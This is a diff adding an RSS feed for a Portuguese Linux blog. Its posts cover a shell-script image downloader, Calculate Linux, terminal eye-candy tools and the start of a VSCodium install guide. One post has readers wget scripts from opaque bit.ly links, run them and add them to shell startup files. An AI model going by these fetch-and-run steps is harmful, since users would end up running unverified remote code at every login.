@@ -1,0 +1,775 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Terminal Root</title>
+    <description>Site, Blog sobre GNU/Linux, Shell Script, Gentoo e BSD. Cursos, Dicas, Tutoriais e mais sobre Desenvolvimento, Web e Tecnologia em geral.
+</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Thu, 16 May 2019 21:16:57 -0300</pubDate>
+    <lastBuildDate>Thu, 16 May 2019 21:16:57 -0300</lastBuildDate>
+    <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Conheça o Projeto MG-Renders feito em Shell Script</title>
+        <description>&lt;h2 id=&quot;projeto&quot;&gt;Projeto&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Projeto criado para automatizar o download de suas buscas no site &lt;mg-renders.net&gt;&lt;/mg-renders.net&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/Tur1st4/MG-Renders&quot;&gt;https://github.com/Tur1st4/MG-Renders&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/contrib/mg-renders.jpg&quot; alt=&quot;Exemplo MG-RENDERS&quot; title=&quot;Exemplo do script em execução&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;como-baixar&quot;&gt;Como baixar&lt;/h2&gt;
+
+&lt;p&gt;Use o comando:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git clone https://github.com/Tur1st4/MG-Renders.git&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;como-usar&quot;&gt;Como usar&lt;/h2&gt;
+
+&lt;p&gt;Quando o download for concluído entre na pasta com o comando: &lt;code class=&quot;highlighter-rouge&quot;&gt;cd MG-Renders&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Depois dê permissão de execução para todos os arquivos: chmod +x *&lt;/p&gt;
+
+&lt;p&gt;Execute o arquivo: &lt;kbd&gt;./INSTALL&lt;/kbd&gt;&lt;/p&gt;
+
+&lt;p&gt;Ele irá perguntar se você realmente deseja criar as pastas, digite &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt; e tecle &lt;code class=&quot;highlighter-rouge&quot;&gt;Enter&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Terminando, você irá para a segunda etapa…&lt;/p&gt;
+
+&lt;p&gt;Nessa etapa ele pedirá um local para salvar suas Renders, coloque por exemplo &lt;code class=&quot;highlighter-rouge&quot;&gt;$HOME/Donwloads&lt;/code&gt; e tecle &lt;code class=&quot;highlighter-rouge&quot;&gt;Enter&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Finalizando, execute o arquivo &lt;code class=&quot;highlighter-rouge&quot;&gt;main.sh&lt;/code&gt; com o comando: ./main.sh&lt;/p&gt;
+
+&lt;p&gt;Aqui você terá que observar se sua busca foi no campo &lt;code class=&quot;highlighter-rouge&quot;&gt;Anime&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;Hentai&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Veja qual foi e coloque &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt; para &lt;code class=&quot;highlighter-rouge&quot;&gt;Anime&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;H&lt;/code&gt; para &lt;code class=&quot;highlighter-rouge&quot;&gt;Hentai&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Agora você pode copiar a URL da busca e colar, tecle &lt;code class=&quot;highlighter-rouge&quot;&gt;Enter&lt;/code&gt; para começar a baixar os seus Renders.&lt;/p&gt;
+
+&lt;p&gt;Ele finalizará mostrando que o download foi concluido com sucesso e quantos arquivos que ele baixou.&lt;/p&gt;
+
+&lt;p&gt;Terá a pergunta se você quer fazer outro download, tecle &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt; para fazer outro ou &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt; para finalizar o script.&lt;/p&gt;
+
+&lt;h2 id=&quot;erros&quot;&gt;Erros&lt;/h2&gt;
+
+&lt;p&gt;Caso encontre algum erro, vá no link do Projeto e reporte no Issues.&lt;/p&gt;
+
+&lt;p&gt;Obrigado por baixar e usar o meu projeto!&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Essa postagem foi criada por &lt;a href=&quot;http://bit.ly/Tur1st4&quot;&gt;Paulo Jacob Tur1st4&lt;/a&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;quer-ficar-fera-no-terminal-e-em-comandos-linux-&quot;&gt;Quer ficar fera no Terminal e em comandos Linux ?&lt;/h2&gt;
+
+&lt;p&gt;Conheça nos cursos de &lt;a href=&quot;http://terminalroot.com.br/shell&quot;&gt;Shell Script&lt;/a&gt; e &lt;a href=&quot;http://terminalroot.com.br/cursos&quot;&gt;entre outros&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;comente&quot;&gt;Comente!&lt;/h2&gt;
+
+&lt;p&gt;Valeu!&lt;/p&gt;
+</description>
+        <pubDate>Thu, 02 May 2019 21:54:57 -0300</pubDate>
+        <link>http://localhost:4000/2019/05/conheca-o-projeto-mg-renders-feito-em-shell-script.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/05/conheca-o-projeto-mg-renders-feito-em-shell-script.html</guid>
+        
+        <category>mg-renders</category>
+        
+        <category>linux</category>
+        
+        <category>anime</category>
+        
+        <category>jacob</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Calculate Linux com Cinnamon - Um Gentoo Prático</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/img/distros/calculate-linux.jpg&quot; alt=&quot;Calculate Linux com Cinnamon - Um Gentoo Prático&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;introdução&quot;&gt;Introdução&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://wiki.calculate-linux.org&quot;&gt;Calculate Linux&lt;/a&gt; é uma distribuição Linux da Rússia e é otimizada para implementação rápida em um ambiente corporativo. É baseado no projeto &lt;a href=&quot;https://gentoo.org&quot;&gt;Gentoo&lt;/a&gt; e inclui várias funções pré-configuradas.&lt;/p&gt;
+
+&lt;p&gt;O Calculate Linux é distribuído em cinco tipos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Calcule o Linux Desktop (CLD) - disponibiliza várias GUIs como: LxQt, KDE, MATE, Cinnamon e XFCE;&lt;/li&gt;
+  &lt;li&gt;Calcule o Directory Server (CDS) - já possui pré instalado e pré configurado: Samba , Mail , XMPP , Proxy e entre outros softwares para servidores;&lt;/li&gt;
+  &lt;li&gt;Calcule o Linux Scratch (CLS) - destina-se principalmente a administradores e usuários, que desejam otimizar para situações específicas;&lt;/li&gt;
+  &lt;li&gt;Calcule o Scratch Server (CSS) - um servidor mínimo com apenas o Kernel do Linux e Calcule Utilitários;&lt;/li&gt;
+  &lt;li&gt;e Calcule o Linux Container (CLC) - criado especialmente para ser instalado em um contêiner LXC/LXD.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;características&quot;&gt;Características&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Não possui um gerenciador de pacotes próprio como o &lt;a href=&quot;http://terminalroot.com.br/2018/09/redcore-linux-um-gentoo-simples-de-instalar.html&quot;&gt;Redcore&lt;/a&gt; e o &lt;a href=&quot;http://terminalroot.com.br/2018/02/como-instalar-o-sabayon-um-gentoo-facil.html&quot;&gt;Sabayon&lt;/a&gt; , o Calculate utiliza o próprio &lt;strong&gt;Portage&lt;/strong&gt; para instalar pacotes binários, ou compilar os fontes.&lt;/li&gt;
+  &lt;li&gt;100% compatível com o Gentoo.&lt;/li&gt;
+  &lt;li&gt;Não utiliza &lt;del&gt;systemd&lt;/del&gt; e sim o &lt;strong&gt;OpenRC&lt;/strong&gt; 😊.&lt;/li&gt;
+  &lt;li&gt;Possui o Calculate Console, um aplicativo utilitário que facilita muitas coisas, como por exemplo, criar um Contêiner via interface gráfica.&lt;/li&gt;
+  &lt;li&gt;É rolling-release.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;quer-saber-mais-sobre-o-calculate-linux--assista-ao-vídeo&quot;&gt;Quer saber mais sobre o Calculate Linux ? Assista ao Vídeo:&lt;/h2&gt;
+
+&lt;h1 id=&quot;clique-aqui-para-assistir-ao-vídeo&quot;&gt;&lt;a href=&quot;https://youtu.be/FBcCoOw_bLs&quot;&gt;Clique Aqui Para Assistir Ao Vídeo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;p&gt;Dowload do Calculate Linux: &lt;a href=&quot;https://wiki.calculate-linux.org/en/download&quot;&gt;https://wiki.calculate-linux.org/en/download&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;quer-ficar-fera-no-terminal-e-em-comandos-linux-&quot;&gt;Quer ficar fera no Terminal e em comandos Linux ?&lt;/h2&gt;
+
+&lt;p&gt;Conheça nos cursos de &lt;a href=&quot;http://terminalroot.com.br/shell&quot;&gt;Shell Script&lt;/a&gt; e &lt;a href=&quot;http://terminalroot.com.br/cursos&quot;&gt;entre outros&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;comente&quot;&gt;Comente!&lt;/h2&gt;
+
+&lt;p&gt;Valeu!&lt;/p&gt;
+&lt;h1&gt;…&lt;/h1&gt;
+</description>
+        <pubDate>Mon, 29 Apr 2019 10:59:05 -0300</pubDate>
+        <link>http://localhost:4000/2019/04/calculate-linux-com-cinnamon-um-gentoo-pratico.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/04/calculate-linux-com-cinnamon-um-gentoo-pratico.html</guid>
+        
+        <category>gentoo</category>
+        
+        <category>distros</category>
+        
+        <category>linux</category>
+        
+        <category>shellscript</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>5 Ferramentas para você usar no seu WM</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/img/dicas/5-tools-to-unixporn.jpg&quot; alt=&quot;ScreenShot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nessa postagem vou mostrar 5 ferramentas (in)úteis, mas atrativas para usar no seu &lt;em&gt;rice&lt;/em&gt; no &lt;a href=&quot;https://www.reddit.com/r/unixporn/&quot;&gt;#unixporn&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;1-pipes&quot;&gt;1. Pipes&lt;/h2&gt;
+
+&lt;p&gt;Pipes são proteções de tela animadas&lt;/p&gt;
+
+&lt;p&gt;Para instalar:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git clone https://github.com/pipeseroni/pipes.sh.git
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;pipes.sh
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Depois rode &lt;code class=&quot;highlighter-rouge&quot;&gt;pipes.sh&lt;/code&gt; no terminal , para sair pressione a tecla &lt;em&gt;q&lt;/em&gt; . Mais informações e parâmetros consulte a página da secção 6 do manual: &lt;code class=&quot;highlighter-rouge&quot;&gt;man 6 pipes.sh&lt;/code&gt; .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/dicas/pipes.sh.png&quot; alt=&quot;Screenshot pipes.sh&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Links úteis pro &lt;strong&gt;pipes.sh&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/pipeseroni/pipes.sh&quot;&gt;https://github.com/pipeseroni/pipes.sh&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://pipeseroni.github.io/pipes.sh/pipes.sh.6.html#HISTORY&quot;&gt;https://pipeseroni.github.io/pipes.sh/pipes.sh.6.html#HISTORY&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;2-tty-clock&quot;&gt;2. tty-clock&lt;/h2&gt;
+
+&lt;p&gt;Exibe um simples relógio digital no terminal.&lt;/p&gt;
+
+&lt;p&gt;Para instalar:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git clone https://github.com/xorg62/tty-clock.git
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;tty-clock
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Depois rode &lt;code class=&quot;highlighter-rouge&quot;&gt;tty-clock&lt;/code&gt; no terminal se quiser deixar no centro rode com o parâmetro &lt;em&gt;-c&lt;/em&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;tty-clock -c&lt;/code&gt; , para sair pressione a tecla &lt;em&gt;q&lt;/em&gt; . Mais informações e parâmetros consulte a página da secção 1 do manual: &lt;code class=&quot;highlighter-rouge&quot;&gt;man 1 tty-clock&lt;/code&gt; .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/dicas/tty-clock.png&quot; alt=&quot;Screenshot tty-clock&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Link pro &lt;strong&gt;tty-clock&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/xorg62/tty-clock&quot;&gt;https://github.com/xorg62/tty-clock&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;3-neofetch-com-imagens&quot;&gt;3. Neofetch com imagens:&lt;/h2&gt;
+
+&lt;p&gt;Exibe imagem no neofetch em vez de caracteres ASCII .&lt;/p&gt;
+
+&lt;p&gt;Após instalar o Neofetch via seu gerenciador de pacotes, instale também o pacote &lt;strong&gt;w3m&lt;/strong&gt;, exemplos:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;emerge w3m &lt;span class=&quot;c&quot;&gt;# Gentoo, Funtoo, Sabayon, ...&lt;/span&gt;
+apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;w3m &lt;span class=&quot;c&quot;&gt;# Debian, Ubuntu, Mint, ...&lt;/span&gt;
+pacman &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; w3m &lt;span class=&quot;c&quot;&gt;# Arch, Manjaro, Antergos, ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Depois edite o arquivo de configuração do neofetch: &lt;code class=&quot;highlighter-rouge&quot;&gt;vim ~/.config/neofetch/config.conf&lt;/code&gt; em seguida procure a linha com o termo: &lt;em&gt;image_backend&lt;/em&gt; , se não encontrar adicione-a atribuido ao w3m: &lt;code class=&quot;highlighter-rouge&quot;&gt;image_backend=&quot;w3m&quot;&lt;/code&gt; . Altere também a linha com o termo &lt;strong&gt;image_source&lt;/strong&gt; e atribua o caminho da sua imagem: &lt;code class=&quot;highlighter-rouge&quot;&gt;image_source=&quot;/caminho/da/imagem.png&quot;&lt;/code&gt; , se quiser que apareça o seu Wallpaper, atribua a palavra &lt;em&gt;wallpaper&lt;/em&gt;: &lt;code class=&quot;highlighter-rouge&quot;&gt;image_source=&quot;wallpaper&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Rode o &lt;code class=&quot;highlighter-rouge&quot;&gt;neofetch&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/dicas/neofetch.jpg&quot; alt=&quot;Screenshot neofetch&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Links pro &lt;strong&gt;neofetch&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/dylanaraps/neofetch&quot;&gt;https://github.com/dylanaraps/neofetch&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;4-pacmansh&quot;&gt;4. pacman.sh:&lt;/h2&gt;
+
+&lt;p&gt;Baixe o código: &lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://bit.ly/pacmansh -O pacman.sh&lt;/code&gt; , torne-o executável &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +x pacman.sh&lt;/code&gt; , rode-o: &lt;code class=&quot;highlighter-rouge&quot;&gt;./pacman.sh&lt;/code&gt; . Se quiser que apareça sempre que abrir o terminal, rode os comandos abaixo:&lt;/p&gt;
+
+&lt;p&gt;Para &lt;a href=&quot;http://terminalroot.com.br/shell&quot;&gt;BASH&lt;/a&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;pacman.sh ~/.local/share/
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$HOME/.local/share/pacman.sh'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ~/.bashrc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Para &lt;a href=&quot;http://terminalroot.com.br/2018/02/como-instalar-e-usar-o-shell-zsh-e-o-oh-my-zsh.html&quot;&gt;ZSH&lt;/a&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;pacman.sh ~/.local/share/
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$HOME/.local/share/pacman.sh'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Para &lt;a href=&quot;http://terminalroot.com.br/2018/01/fish-shell-mais-produtividade-no-seu-shell-script.html&quot;&gt;FISH&lt;/a&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;pacman.sh ~/.local/share/
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$HOME/.local/share/pacman.sh'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ~/.fishrc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/dicas/pacman.sh.png&quot; alt=&quot;Screenshot pacman.sh&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;5-colorssh&quot;&gt;5. colors.sh&lt;/h2&gt;
+
+&lt;p&gt;Testa o esquema de cores do emulador do seu terminal.&lt;/p&gt;
+
+&lt;p&gt;Baixe o código: &lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://bit.ly/colorssh -O colors.sh&lt;/code&gt; , torne-o executável &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +x colors.sh&lt;/code&gt; , rode-o: &lt;code class=&quot;highlighter-rouge&quot;&gt;./colors.sh&lt;/code&gt; . Se quiser que vire um comando pro seu usuário, rode os comandos abaixo:&lt;/p&gt;
+
+&lt;p&gt;Para &lt;a href=&quot;http://terminalroot.com.br/shell&quot;&gt;BASH&lt;/a&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;colors.sh ~/.local/share/
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'alias colors=&quot;$HOME/.local/share/colors.sh&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ~/.bashrc
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; ~/.bashrc
+colors&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Para &lt;a href=&quot;http://terminalroot.com.br/2018/02/como-instalar-e-usar-o-shell-zsh-e-o-oh-my-zsh.html&quot;&gt;ZSH&lt;/a&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;colors.sh ~/.local/share/
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'alias colors=&quot;$HOME/.local/share/colors.sh&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ~/.zshrc
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; ~/.zshrc
+colors&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Para &lt;a href=&quot;http://terminalroot.com.br/2018/01/fish-shell-mais-produtividade-no-seu-shell-script.html&quot;&gt;FISH&lt;/a&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;colors.sh ~/.local/share/
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'alias colors=&quot;$HOME/.local/share/colors.sh&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ~/.fishrc
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; ~/.fishrc
+colors&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/dicas/colors.sh.png&quot; alt=&quot;Colors.sh&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Links úteis:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://terminalroot.com.br/2018/06/novo-curso-extremamente-avancado-de-shell-script-bash.html&quot;&gt;Novo Curso Extremamente Avançado de Shell Script Bash&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://terminalroot.com.br/2019/01/como-criar-um-fetch-estilo-screenfetch-e-neofetch-em-shell-script.html&quot;&gt;Como Criar um FETCH, estilo ScreenFetch e Neofetch em SHELL SCRIPT&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://terminalroot.com.br/2018/01/fish-shell-mais-produtividade-no-seu-shell-script.html&quot;&gt;Fish Shell, mais produtividade no seu Shell Script&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://terminalroot.com.br/2018/09/aprenda-a-criar-shell-script-profissional-episodio-1.html&quot;&gt;Aprenda a Criar Shell Script Profissional - Episódio 1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://terminalroot.com.br/2018/02/como-instalar-e-usar-o-shell-zsh-e-o-oh-my-zsh.html&quot;&gt;Como Instalar e Usar o Shell ZSH e o Oh My Zsh!&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;quer-ficar-fera-no-terminal-e-em-comandos-linux-&quot;&gt;Quer ficar fera no Terminal e em comandos Linux ?&lt;/h2&gt;
+
+&lt;p&gt;Conheça nos cursos de &lt;a href=&quot;http://terminalroot.com.br/shell&quot;&gt;Shell Script&lt;/a&gt; e &lt;a href=&quot;http://terminalroot.com.br/cursos&quot;&gt;entre outros&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;comente&quot;&gt;Comente!&lt;/h2&gt;
+
+&lt;p&gt;Valeu!&lt;/p&gt;
+</description>
+        <pubDate>Thu, 25 Apr 2019 17:16:38 -0300</pubDate>
+        <link>http://localhost:4000/2019/04/5-ferramentas-para-voce-usar-no-seu-wm.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/04/5-ferramentas-para-voce-usar-no-seu-wm.html</guid>
+        
+        <category>shellscript</category>
+        
+        <category>shell</category>
+        
+        <category>bash</category>
+        
+        <category>fetch</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>VSCodium - Um VS Code Open Source que NÃO te rastreia</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/img/editores/vscodium.png&quot; alt=&quot;VSCodium - Um VS Code Open Source que NÃO te rasrtreia&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;introdução&quot;&gt;Introdução&lt;/h2&gt;
+
+&lt;p&gt;O &lt;a href=&quot;https://vscodium.com/&quot;&gt;VSCodium&lt;/a&gt; é um editor idêntico ao &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;Visual Studio Code&lt;/a&gt; da Microsoft, mas as únicas diferenças é que o ícone é diferente e o melhor de tudo, ele não possui &lt;em&gt;trackers&lt;/em&gt; e nem telemetria para medir e saber o que você desenvolve.&lt;/p&gt;
+
+&lt;p&gt;Está disponível para &lt;a href=&quot;http://terminalroot.com.br/2019/04/como-acessar-o-windows-pelo-linux-com-metasploit.html&quot;&gt;Windows&lt;/a&gt;, &lt;a href=&quot;http://terminalroot.com.br/2018/03/como-instalar-o-mac-os-x-em-virtualbox-no-linux.html&quot;&gt;macOS&lt;/a&gt; e &lt;a href=&quot;http://cse.google.com.br/cse?cx=004473188612396442360:qs2ekmnkweq&amp;amp;q=Linux&quot;&gt;Linux&lt;/a&gt;. Ele vem com suporte embutido para &lt;a href=&quot;http://terminalroot.com.br/2018/01/rodando-javascript-via-terminal-e-shell-via-js.html&quot;&gt;JavaScript&lt;/a&gt;, &lt;a href=&quot;https://www.typescriptlang.org/&quot;&gt;TypeScript&lt;/a&gt; e &lt;a href=&quot;https://nodejs.org&quot;&gt;Node.js&lt;/a&gt; e possui um rico ecossistema de extensões para outras linguagens (como C++, C#, Java, Python, PHP, Go) e tempos de execução (como .NET e Unity).&lt;/p&gt;
+
+&lt;p&gt;O VSCodium tem suporte nativo ao &lt;a href=&quot;http://terminalroot.com.br/git&quot;&gt;Git&lt;/a&gt; e é uma Software Livre de Código Aberto licenciado pela &lt;a href=&quot;https://opensource.org/licenses/MIT&quot;&gt;MIT License&lt;/a&gt; .&lt;/p&gt;
+
+&lt;h2 id=&quot;instalação&quot;&gt;Instalação&lt;/h2&gt;
+
+&lt;p&gt;Você pode baixar e instalar o VSCodium diretamente da &lt;a href=&quot;https://github.com/VSCodium/vscodium&quot;&gt;página de downloads&lt;/a&gt; onde há diversas versões para diferentes arquiteturas e sistemas operacionais. Além do &lt;em&gt;tar.gz&lt;/em&gt; para qualquer distribuição Linux , existe também o &lt;em&gt;.deb&lt;/em&gt; para Debian, Ubuntu, Linux Mint e derivados. Ou você pode usar o próprio APT pra isso, com os seguintes comandos:&lt;/p&gt;
+
+&lt;p&gt;Adicone primeiro a chave pública&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wget &lt;span class=&quot;nt&quot;&gt;-qO&lt;/span&gt; - https://gitlab.com/paulcarroty/vscodium-deb-rpm-repo/raw/master/pub.gpg | &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-key add -&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Insira o repositório no diretório &lt;em&gt;source.list.d/&lt;/em&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'deb https://gitlab.com/paulcarroty/vscodium-deb-rpm-repo/raw/repos/debs/ vscodium main'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--append&lt;/span&gt; /etc/apt/sources.list.d/vscodium.list&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Atualize o APT e instale o VSCodium&lt;/p&gt;
+
